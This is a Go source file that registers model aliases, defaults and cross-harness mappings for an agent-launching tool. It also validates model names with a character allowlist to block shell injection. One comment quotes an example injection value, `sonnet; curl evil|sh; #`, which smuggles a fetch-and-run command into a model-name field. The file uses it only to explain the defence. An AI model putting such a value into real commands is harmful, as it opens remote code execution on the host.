package agent

import (
	"fmt"
	"os"
	"slices"
	"strings"
)

// ModelSpec maps a short alias to a full model identifier.
type ModelSpec struct {
	Alias       string
	FullName    string
	Description string
}

// ModelFamilySpec describes a first-class model family that AGM can route
// through at least one supported harness or model aggregator.
type ModelFamilySpec struct {
	Name        string
	Provider    string
	Priority    int
	Description string
}

// SupportedModelFamilies is the canonical model-family parity set.
// Anthropic, OpenAI, and Gemini are the incumbent first-party families. GLM,
// DeepSeek, Nemotron, and Qwen are OpenRouter-compatible open-model families
// prioritized for cost and quota diversity.
var SupportedModelFamilies = []ModelFamilySpec{
	{Name: "anthropic", Provider: "Anthropic", Priority: 0, Description: "Claude family used by Claude Code, Pi, and OpenRouter"},
	{Name: "openai", Provider: "OpenAI", Priority: 0, Description: "GPT family used by Codex CLI and Pi"},
	{Name: "gemini", Provider: "Google", Priority: 0, Description: "Gemini family used by AGY, Pi, and legacy Gemini CLI"},
	{Name: "glm", Provider: "Z.ai", Priority: 1, Description: "GLM 5.2 family, first new open-model priority"},
	{Name: "deepseek", Provider: "DeepSeek", Priority: 2, Description: "DeepSeek V4 family, second new open-model priority"},
	{Name: "nemotron", Provider: "NVIDIA", Priority: 3, Description: "Nemotron family, third new open-model priority"},
	{Name: "qwen", Provider: "Alibaba", Priority: 4, Description: "Qwen family, fourth new open-model priority"},
}

// HarnessModels defines known models per harness.
var HarnessModels = map[string][]ModelSpec{
	"claude-code": {
		{Alias: "fable", FullName: "claude-fable-5", Description: "Mythos-class, most capable, 1M context, 128k max output (free on Pro/Max/Team through 2026-06-23)"},
		{Alias: "opus", FullName: "claude-opus-4-8[1m]", Description: "Latest Opus, 1M context"},
		{Alias: "opus5", FullName: "claude-opus-5", Description: "Claude Opus 5, 1M context (default and only context size, no smaller variant), same price as Opus 4.8 ($5/$25 per Mtok)"},
		{Alias: "sonnet", FullName: "claude-sonnet-4-6[1m]", Description: "Latest Sonnet, 1M context"},
		{Alias: "haiku", FullName: "claude-haiku-4-5", Description: "Fast, 200k context"},
		{Alias: "opus-200k", FullName: "claude-opus-4-8", Description: "Opus with default 200k context"},
		{Alias: "sonnet-200k", FullName: "claude-sonnet-4-6", Description: "Sonnet with default 200k context"},
		{Alias: "opusplan", FullName: "opusplan", Description: "Opus for planning, Sonnet for execution"},
	},
	// gemini-cli is deprecated for non-enterprise users in favor of AGY.
	// Keep its model registry for legacy sessions only.
	"gemini-cli": {
		{Alias: "3.1-pro", FullName: "gemini-3.1-pro-preview", Description: "Latest, advanced reasoning"},
		{Alias: "3-flash", FullName: "gemini-3-flash-preview", Description: "High performance, lower cost"},
		{Alias: "3.1-flash-lite", FullName: "gemini-3.1-flash-lite-preview", Description: "Fastest, cheapest"},
		{Alias: "2.5-pro", FullName: "gemini-2.5-pro", Description: "Stable, complex tasks"},
		{Alias: "3.5-flash", FullName: "gemini-3.5-flash", Description: "Stable, best price-performance (GA 2026-05-19)"},
		{Alias: "2.5-flash-lite", FullName: "gemini-2.5-flash-lite", Description: "Budget multimodal"},
	},
	"codex-cli": {
		// GPT-5.6 explicit tiers. "gpt-5.6" alone is a pre-announcement/alias
		// string codex CLI rejects ("model metadata for gpt-5.6 not found"); the
		// resolvable IDs are the sol/terra/luna tiers. Verified pricing (in/out
		// per Mtok, 1.05M ctx): sol $5/$30, terra $2.50/$15, luna $1/$6.
		{Alias: "5.6-sol", FullName: "gpt-5.6-sol", Description: "5.6 frontier tier ($5/$30) — frontier synthesis only"},
		{Alias: "5.6-terra", FullName: "gpt-5.6-terra", Description: "5.6 balanced tier ($2.50/$15) — worker/agentic DEFAULT"},
		{Alias: "5.6-luna", FullName: "gpt-5.6-luna", Description: "5.6 volume tier ($1/$6) — high-volume/cheap"},
		// Bare "5.6" resolves to the worker default (terra), NOT the expensive
		// frontier tier — spawns must opt in to sol explicitly.
		{Alias: "5.6", FullName: "gpt-5.6-terra", Description: "5.6 alias → terra (worker default); use 5.6-sol/-luna for other tiers"},
		{Alias: "5.5", FullName: "gpt-5.5", Description: "Flagship frontier model (ChatGPT-account default)"},
		{Alias: "5.4", FullName: "gpt-5.4", Description: "Flagship frontier model"},
		{Alias: "5.4-mini", FullName: "gpt-5.4-mini", Description: "Fast, efficient"},
		{Alias: "5.3-codex", FullName: "gpt-5.3-codex", Description: "Industry-leading coding model"},
		{Alias: "5.3-codex-spark", FullName: "gpt-5.3-codex-spark", Description: "Research preview"},
	},
	"agy": {
		{Alias: "3.5-flash", FullName: "Gemini 3.5 Flash (Medium)", Description: "AGY default; balanced Gemini 3.5 Flash reasoning"},
		{Alias: "3.5-flash-medium", FullName: "Gemini 3.5 Flash (Medium)", Description: "Balanced Gemini 3.5 Flash reasoning"},
		{Alias: "3.5-flash-high", FullName: "Gemini 3.5 Flash (High)", Description: "Higher-reasoning Gemini 3.5 Flash"},
		{Alias: "3.5-flash-low", FullName: "Gemini 3.5 Flash (Low)", Description: "Fast, low-reasoning Gemini 3.5 Flash"},
		{Alias: "3.1-pro-low", FullName: "Gemini 3.1 Pro (Low)", Description: "Gemini 3.1 Pro with lower reasoning"},
		{Alias: "3.1-pro-high", FullName: "Gemini 3.1 Pro (High)", Description: "Gemini 3.1 Pro with higher reasoning"},
		{Alias: "claude-sonnet-4.6-thinking", FullName: "Claude Sonnet 4.6 (Thinking)", Description: "Claude Sonnet 4.6 with thinking"},
		{Alias: "claude-opus-4.6-thinking", FullName: "Claude Opus 4.6 (Thinking)", Description: "Claude Opus 4.6 with thinking"},
		{Alias: "gpt-oss-120b-medium", FullName: "GPT-OSS 120B (Medium)", Description: "GPT-OSS 120B with medium reasoning"},
	},
	"pi-cli": {
		{Alias: "fable", FullName: "anthropic/claude-fable-5", Description: "Claude Fable 5 through Pi's Anthropic provider"},
		{Alias: "sonnet", FullName: "anthropic/claude-sonnet-4-6", Description: "Claude Sonnet 4.6 through Pi's Anthropic provider"},
		{Alias: "opus", FullName: "anthropic/claude-opus-4-8", Description: "Claude Opus 4.8 through Pi's Anthropic provider"},
		{Alias: "opus5", FullName: "anthropic/claude-opus-5", Description: "Claude Opus 5 through Pi's Anthropic provider"},
		{Alias: "haiku", FullName: "anthropic/claude-haiku-4-5", Description: "Claude Haiku 4.5 through Pi's Anthropic provider"},
		{Alias: "gpt-frontier", FullName: "openai/gpt-5.6-sol", Description: "GPT-5.6 Sol through Pi's OpenAI provider"},
		{Alias: "gpt", FullName: "openai/gpt-5.6-terra", Description: "GPT-5.6 Terra through Pi's OpenAI provider"},
		{Alias: "gpt-fast", FullName: "openai/gpt-5.6-luna", Description: "GPT-5.6 Luna through Pi's OpenAI provider"},
		{Alias: "gemini-flash", FullName: "google/gemini-3.5-flash", Description: "Gemini 3.5 Flash through Pi's Google provider"},
		{Alias: "gemini-flash-lite", FullName: "google/gemini-3.1-flash-lite", Description: "Gemini 3.1 Flash Lite through Pi's Google provider"},
		{Alias: "glm-5.2", FullName: "openrouter/z-ai/glm-5.2", Description: "GLM 5.2 through Pi's OpenRouter provider"},
		{Alias: "deepseek-v4", FullName: "openrouter/deepseek/deepseek-v4-pro", Description: "DeepSeek V4 Pro through Pi's OpenRouter provider"},
		{Alias: "nemotron", FullName: "openrouter/nvidia/nemotron-3-ultra-550b-a55b", Description: "Nemotron 3 Ultra through Pi's OpenRouter provider"},
		{Alias: "qwen", FullName: "openrouter/qwen/qwen3.6-max-preview", Description: "Qwen 3.6 Max through Pi's OpenRouter provider"},
	},
	// openrouter: cheap-tier models accessed via OpenRouter API proxy.
	// Configure OPENROUTER_API_KEY to enable. These are the default cheap-tier
	// assignments; override per-bead via model_tier spec.
	"openrouter": {
		{Alias: "glm-5.2", FullName: "z-ai/glm-5.2", Description: "GLM 5.2 family default via OpenRouter-compatible routing"},
		{Alias: "glm", FullName: "z-ai/glm-5.2", Description: "GLM 5.2 family default via OpenRouter-compatible routing"},
		{Alias: "deepseek-v4", FullName: "deepseek/deepseek-v4-pro", Description: "DeepSeek V4 Pro family default via OpenRouter-compatible routing"},
		{Alias: "deepseek-v4-flash", FullName: "deepseek/deepseek-v4-flash", Description: "DeepSeek V4 Flash family default via OpenRouter-compatible routing"},
		{Alias: "deepseek-flash", FullName: "deepseek/deepseek-v4-flash", Description: "DeepSeek V4 Flash family default via OpenRouter-compatible routing"},
		{Alias: "nemotron", FullName: "nvidia/nemotron-3-ultra-550b-a55b", Description: "Nemotron family default via OpenRouter-compatible routing"},
		{Alias: "qwen", FullName: "qwen/qwen3.6-max-preview", Description: "Qwen family default via OpenRouter-compatible routing"},
		{Alias: "qwen-flash", FullName: "qwen/qwen3.6-35b-a3b", Description: "Qwen 3.6 family low-cost option via OpenRouter-compatible routing"},
		{Alias: "gemini-flash", FullName: "google/gemini-flash-1.5", Description: "Gemini Flash — fast, cheap, good for extraction"},
		{Alias: "gemini-pro", FullName: "google/gemini-pro-1.5", Description: "Gemini Pro — mid-tier via OpenRouter"},
		{Alias: "opus", FullName: "anthropic/claude-opus-4", Description: "Claude Opus via OpenRouter — expensive tier"},
		{Alias: "opus5", FullName: "anthropic/claude-opus-5", Description: "Claude Opus 5 via OpenRouter — expensive tier"},
	},
	// opencode-cli: aggregated from all other harnesses (built dynamically)
}

// legacyModelAliases preserves resumability for manifests written before a
// harness replaced its public model catalog. Values point to current aliases
// so every caller still crosses the normal registry and exact-label boundary.
var legacyModelAliases = map[string]map[string]string{
	"codex-cli": {
		// These provider-style names are accepted by AGM input paths but are
		// rejected by ChatGPT-account Codex auth. Resolve them to the native
		// account-supported spellings before the private executor launches codex.
		"gpt-5.6":       "5.6-sol",
		"gpt-5.5-codex": "5.5",
	},
	"agy": {
		"2.5-flash":             "3.5-flash",
		"gemini-2.5-flash":      "3.5-flash",
		"2.5-pro":               "3.1-pro-high",
		"gemini-2.5-pro":        "3.1-pro-high",
		"2.0-flash-lite":        "3.5-flash-low",
		"gemini-2.0-flash-lite": "3.5-flash-low",
	},
}

// CrossHarnessAliases maps abstract tier names to harness-specific aliases.
// When an abstract tier alias is passed to a harness, this table maps it to
// that harness's closest available native model alias.
// Only tier names that differ across harnesses need entries.
var CrossHarnessAliases = map[string]map[string]string{
	"gemini-cli": {
		"fable":  "3.1-pro",   // mythos-tier → gemini-3.1-pro-preview (best available)
		"opus":   "2.5-pro",   // highest-tier → gemini-2.5-pro
		"sonnet": "3.1-pro",   // mid-tier → gemini-3.1-pro-preview
		"haiku":  "3.5-flash", // fast-tier → gemini-3.5-flash
	},
	"codex-cli": {
		"fable":  "5.5",      // mythos-tier → gpt-5.5 (ChatGPT-account supported)
		"opus":   "5.5",      // highest-tier → gpt-5.5
		"sonnet": "5.5",      // mid-tier → gpt-5.5 (no direct equivalent)
		"haiku":  "5.4-mini", // fast-tier → gpt-5.4-mini
	},
	"claude-code": {
		"2.5-pro":   "opus",   // gemini alias → claude equivalent
		"3.1-pro":   "sonnet", // gemini alias → claude equivalent
		"3.5-flash": "haiku",  // gemini alias → claude equivalent
		"5.6":       "opus",   // codex alias → claude equivalent
		"5.6-sol":   "opus",   // codex tier → claude equivalent (frontier)
		"5.6-terra": "sonnet", // codex tier → claude equivalent (balanced)
		"5.6-luna":  "haiku",  // codex tier → claude equivalent (volume)
		"5.5":       "opus",   // codex alias → claude equivalent
		"5.4":       "opus",   // codex alias → claude equivalent
		"5.4-mini":  "haiku",  // codex alias → claude equivalent
	},
	"agy": {
		"fable":  "claude-opus-4.6-thinking", // mythos-tier → highest available AGY catalog model
		"opus":   "claude-opus-4.6-thinking", // highest-tier → Claude Opus 4.6 (Thinking)
		"sonnet": "3.5-flash",                // mid-tier → Gemini 3.5 Flash (Medium)
		"haiku":  "3.5-flash-low",            // fast-tier → Gemini 3.5 Flash (Low)
	},
}

// HarnessDefaults defines the default model alias for each active harness.
// Harnesses not listed here require interactive model selection.
//
// claude-code defaults to sonnet. Opus stays opt-in via --model=opus or
// AGM_DEFAULT_MODEL=opus; Opus costs ~5× Sonnet per token and should not be
// the silent default.
var HarnessDefaults = map[string]string{
	"claude-code":  "sonnet",
	"codex-cli":    "5.5",
	"agy":          "3.5-flash",
	"opencode-cli": "glm-5.2",
	"pi-cli":       "sonnet",
}

// HarnessModeDefaults defines the default permission mode for each harness.
// Harnesses not listed here start with no explicit permission mode.
var HarnessModeDefaults = map[string]string{
	"claude-code": "plan",
}

// TestModelDefaults defines cheap/fast models used for --test sessions.
// These ensure predictable, low-cost test runs regardless of the caller's model.
var TestModelDefaults = map[string]string{
	"claude-code":  "haiku",
	"codex-cli":    "5.4-mini",
	"agy":          "3.5-flash-low",
	"opencode-cli": "haiku", // opencode supports Claude models via providers
	"pi-cli":       "gemini-flash-lite",
}

// TestModelForHarness returns the test-specific model for a harness.
// Returns the test default and true, or empty string and false if none defined.
func TestModelForHarness(harnessName string) (string, bool) {
	d, ok := TestModelDefaults[harnessName]
	return d, ok
}

// HarnessModelFlag defines the CLI flag each harness uses to receive the model.
var HarnessModelFlag = map[string]string{
	"claude-code": "--model",
	"gemini-cli":  "-m",
	"codex-cli":   "-m",
	"agy":         "--model",
	"pi-cli":      "--model",
	// opencode-cli uses config/env var, not a CLI flag
}

// modelCharOK reports whether r is a character allowed inside a model
// identifier (alias or full name). Real Claude/Gemini model strings are
// purely [A-Za-z0-9._-/:], and we use this allowlist as a hard gate
// because the resolved value flows unquoted into shell command strings
// that are pasted into tmux panes (see buildClaudeCommand,
// startGeminiDirect, etc.). Allowing anything outside this set would
// re-open the RCE that motivated this check.
func modelCharOK(r rune) bool {
	switch {
	case r >= 'a' && r <= 'z':
		return true
	case r >= 'A' && r <= 'Z':
		return true
	case r >= '0' && r <= '9':
		return true
	case r == '.' || r == '_' || r == '-' || r == '/' || r == ':':
		return true
	}
	return false
}

// ValidateModel checks that a model alias is safe to pass to a harness.
// A registered alias always passes; otherwise the alias must consist solely
// of model-identifier characters (alphanumeric plus `._-/:`). Anything else
// is rejected because the resolved string is interpolated unquoted into
// shell commands sent to tmux panes — a passthrough value like
// `sonnet; curl evil|sh; #` would otherwise produce an RCE primitive
// reachable from CLI flags, AGM_DEFAULT_MODEL, or any automation that sets
// these from untrusted input.
func ValidateModel(harnessName, modelAlias string) error {
	modelAlias = NormalizeModelInput(harnessName, modelAlias)
	models := GetModelsForHarness(harnessName)
	for _, m := range models {
		if m.Alias == modelAlias || m.FullName == modelAlias {
			return nil
		}
	}
	if legacy, ok := legacyModelAliases[harnessName]; ok {
		if _, ok := legacy[modelAlias]; ok {
			return nil
		}
	}
	if modelAlias == "" {
		return fmt.Errorf("model is empty")
	}
	for _, r := range modelAlias {
		if !modelCharOK(r) {
			return fmt.Errorf("model %q contains disallowed character %q (allowed set: alphanumeric and dot underscore dash slash colon)", modelAlias, r)
		}
	}
	// Unknown but syntactically safe: warn and allow (forward-compat).
	fmt.Fprintf(os.Stderr, "Warning: model '%s' not in registry for harness '%s'. Passing through as-is.\n", modelAlias, harnessName)
	return nil
}

// NormalizeModelInput canonicalizes registered aliases case-insensitively
// while preserving exact public labels and unknown forward-compatible model
// identifiers. Public labels can be case-sensitive and must not be lowercased.
func NormalizeModelInput(harnessName, input string) string {
	harnessName = NormalizeHarnessName(harnessName)
	models := GetModelsForHarness(harnessName)
	for _, model := range models {
		if model.FullName == input || model.Alias == input {
			return input
		}
	}
	for _, model := range models {
		if strings.EqualFold(model.Alias, input) {
			return model.Alias
		}
	}
	if crossMap, ok := CrossHarnessAliases[harnessName]; ok {
		for alias := range crossMap {
			if strings.EqualFold(alias, input) {
				return alias
			}
		}
	}
	if legacy, ok := legacyModelAliases[harnessName]; ok {
		for old := range legacy {
			if strings.EqualFold(old, input) {
				return old
			}
		}
	}
	return input
}

// ResolveModelFullName resolves an alias to a full model name.
// If the alias is not found natively, checks CrossHarnessAliases for a mapping
// from another harness's tier name (e.g., "opus" → "2.5-pro" for gemini-cli).
// If still not found, returns the input as-is (passthrough for unknown models).
//
// Defense in depth: the passthrough branch is the one a CLI flag value
// reaches when the user names a model not in the registry. Callers
// interpolate the result unquoted into shell commands, so a passthrough
// value containing shell metacharacters would be RCE. We re-run the
// character allowlist here so a caller that forgot to call ValidateModel
// still can't smuggle a payload through.
func ResolveModelFullName(harnessName, aliasOrFull string) string {
	harnessName = NormalizeHarnessName(harnessName)
	aliasOrFull = NormalizeModelInput(harnessName, aliasOrFull)
	models := GetModelsForHarness(harnessName)
	if len(models) == 0 {
		return safeModelPassthrough(aliasOrFull)
	}
	for _, m := range models {
		if m.Alias == aliasOrFull || m.FullName == aliasOrFull {
			return m.FullName
		}
	}
	if legacy, ok := legacyModelAliases[harnessName]; ok {
		if mapped, ok := legacy[aliasOrFull]; ok {
			fmt.Fprintf(os.Stderr, "Note: mapping legacy model '%s' → '%s' for %s\n", aliasOrFull, mapped, harnessName)
			for _, model := range models {
				if model.Alias == mapped {
					return model.FullName
				}
			}
			return safeModelPassthrough(mapped)
		}
	}

	// Check cross-harness alias mapping (e.g., "opus" → "2.5-pro" for gemini-cli)
	if crossMap, ok := CrossHarnessAliases[harnessName]; ok {
		if mapped, ok := crossMap[aliasOrFull]; ok {
			fmt.Fprintf(os.Stderr, "Note: mapping cross-harness alias '%s' → '%s' for %s\n", aliasOrFull, mapped, harnessName)
			// Resolve the mapped alias to its full name
			for _, m := range models {
				if m.Alias == mapped {
					return m.FullName
				}
			}
			return safeModelPassthrough(mapped) // mapped alias not in models (shouldn't happen)
		}
	}

	return safeModelPassthrough(aliasOrFull)
}

// safeModelPassthrough returns the input only if it is a syntactically safe
// model identifier; otherwise it replaces it with an empty string and logs
// the rejection. Empty causes the harness invocation to surface a clear
// error rather than expanding into a shell injection.
func safeModelPassthrough(s string) string {
	if s == "" {
		return ""
	}
	for _, r := range s {
		if !modelCharOK(r) {
			fmt.Fprintf(os.Stderr, "ResolveModelFullName: refusing to pass through unsafe model %q (character %q not allowed)\n", s, r)
			return ""
		}
	}
	return s
}

// GetModelsForHarness returns known models for a harness.
// For opencode-cli, returns aggregated models from active harnesses.
func GetModelsForHarness(harnessName string) []ModelSpec {
	if harnessName == "opencode-cli" {
		return AllModels()
	}
	return HarnessModels[harnessName]
}

// DefaultModelForHarness returns the default model alias and true,
// or empty string and false if no default exists.
func DefaultModelForHarness(harnessName string) (string, bool) {
	d, ok := HarnessDefaults[harnessName]
	return d, ok
}

// DefaultModeForHarness returns the default permission mode and true,
// or empty string and false if no default exists.
func DefaultModeForHarness(harnessName string) (string, bool) {
	d, ok := HarnessModeDefaults[harnessName]
	return d, ok
}

// NeedsInteractivePicker returns true if the harness has no default model
// and requires the user to select one interactively.
func NeedsInteractivePicker(harnessName string) bool {
	_, hasDefault := HarnessDefaults[harnessName]
	return !hasDefault
}

// AllModels returns a stable aggregated catalog for OpenCode. Pi's
// provider-qualified routes lead because OpenCode, like Pi, requires an exact
// provider/model identifier; aggregator-only and harness-native extras follow
// in explicit order. Never iterate HarnessModels directly here: map order made
// duplicate aliases resolve to different providers across calls.
func AllModels() []ModelSpec {
	order := []string{"pi-cli", "openrouter", "claude-code", "codex-cli", "agy"}
	var all []ModelSpec
	for _, harness := range order {
		all = append(all, HarnessModels[harness]...)
	}
	return all
}

// ModelFamilyNames returns supported model families in canonical priority order.
func ModelFamilyNames() []string {
	names := make([]string, 0, len(SupportedModelFamilies))
	for _, family := range SupportedModelFamilies {
		names = append(names, family.Name)
	}
	return names
}

// IsSupportedModelFamily reports whether family is part of the parity set.
func IsSupportedModelFamily(family string) bool {
	return slices.Contains(ModelFamilyNames(), strings.ToLower(family))
}

// ModelFamilyForName infers the family for a full model identifier or alias.
func ModelFamilyForName(name string) string {
	lower := strings.ToLower(name)
	switch {
	case strings.Contains(lower, "anthropic/") || strings.Contains(lower, "claude"):
		return "anthropic"
	case strings.Contains(lower, "openai/") || strings.Contains(lower, "gpt"):
		return "openai"
	case strings.Contains(lower, "google/") || strings.Contains(lower, "gemini"):
		return "gemini"
	case strings.Contains(lower, "z-ai/") || strings.Contains(lower, "zhipu") || strings.Contains(lower, "glm"):
		return "glm"
	case strings.Contains(lower, "deepseek"):
		return "deepseek"
	case strings.Contains(lower, "nvidia/") || strings.Contains(lower, "nemotron"):
		return "nemotron"
	case strings.Contains(lower, "qwen") || strings.Contains(lower, "alibaba"):
		return "qwen"
	default:
		return ""
	}
}

// ModelFamiliesForHarness returns the supported model families reachable from
// a harness's configured model aliases.
func ModelFamiliesForHarness(harnessName string) []string {
	seen := make(map[string]bool)
	var families []string
	for _, model := range GetModelsForHarness(harnessName) {
		for _, candidate := range []string{model.Alias, model.FullName} {
			family := ModelFamilyForName(candidate)
			if family == "" || seen[family] {
				continue
			}
			seen[family] = true
			families = append(families, family)
		}
	}
	return families
}

// DefaultModelForFamily returns the first configured model matching a family.
// The search order is canonical and favors active harnesses before aggregators.
func DefaultModelForFamily(family string) (ModelSpec, bool) {
	family = strings.ToLower(family)
	for _, harness := range append(ActiveHarnesses(), "openrouter") {
		for _, model := range GetModelsForHarness(harness) {
			if ModelFamilyForName(model.FullName) == family ||
				ModelFamilyForName(model.Alias) == family {
				return model, true
			}
		}
	}
	return ModelSpec{}, false
}

// ModelAliases returns just the alias strings for a harness, suitable for
// tab completion.
func ModelAliases(harnessName string) []string {
	models := GetModelsForHarness(harnessName)
	aliases := make([]string, 0, len(models))
	for _, m := range models {
		aliases = append(aliases, m.Alias)
	}
	return aliases
}
